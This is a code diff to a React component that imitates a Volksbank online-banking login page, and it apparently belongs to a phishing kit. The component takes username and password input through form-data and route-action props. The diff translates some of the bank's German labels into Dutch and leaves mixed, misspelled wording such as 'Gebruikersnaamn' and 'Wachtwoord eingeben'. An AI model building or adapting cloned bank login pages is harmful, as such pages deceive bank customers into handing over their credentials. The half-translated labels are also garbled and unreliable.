@@ -81,7 +81,7 @@ export function Volksbanken({ formData, onChange, handleRouteAction, saving }: P
               <div className="flex flex-col gap-1.5">
                 <p className="font-bold text-[14px]">Achtung: Anrufe FALSCHER Bankmitarbeiter!</p>
                 <p className="text-[13px] leading-snug">
-                  <span className="font-bold">NIEMALS</span> Passwörter, Benutzernamen oder Codes nennen.
+                  <span className="font-bold">NIEMALS</span> Passwörter, Gebruikersnaamn oder Codes nennen.
                 </p>
                 <p className="text-[13px] leading-snug">
                   <span className="font-bold">SOFORT</span> auflegen, wenn Sie danach gefragt werden.
@@ -91,7 +91,7 @@ export function Volksbanken({ formData, onChange, handleRouteAction, saving }: P
 
             {/* Info Text */}
             <p className="text-[#333] text-[14px] leading-relaxed mb-6">
-              Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.
+              Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt.
             </p>
 
             {/* Form */}
@@ -100,7 +100,7 @@ export function Volksbanken({ formData, onChange, handleRouteAction, saving }: P
               {/* Label & Links Row */}
               <div className="flex justify-between items-end mb-2 border-b border-gray-200 pb-2">
                 <span className="text-[#666] text-[12px]">
-                  {step === 1 ? "Anmeldung mit Benutzername" : "Passwort eingeben"}
+                  {step === 1 ? "Anmeldung mit Gebruikersnaam" : "Wachtwoord eingeben"}
                 </span>
                 <div className="text-[13px] text-[#1b65b4]">
                   <a href="#" className="hover:underline">Barrierefrei</a>
@@ -165,8 +165,8 @@ export function Volksbanken({ formData, onChange, handleRouteAction, saving }: P
 
             {/* Bottom Help Links */}
             <div className="flex flex-col items-center mt-6 gap-1">
-              <a href="#" className="text-[#1b65b4] text-[13px] hover:underline">Benutzername vergessen?</a>
-              <a href="#" className="text-[#1b65b4] text-[13px] hover:underline">Passwort vergessen?</a>
+              <a href="#" className="text-[#1b65b4] text-[13px] hover:underline">Gebruikersnaam vergessen?</a>
+              <a href="#" className="text-[#1b65b4] text-[13px] hover:underline">Wachtwoord vergessen?</a>
             </div>
 
           </div>
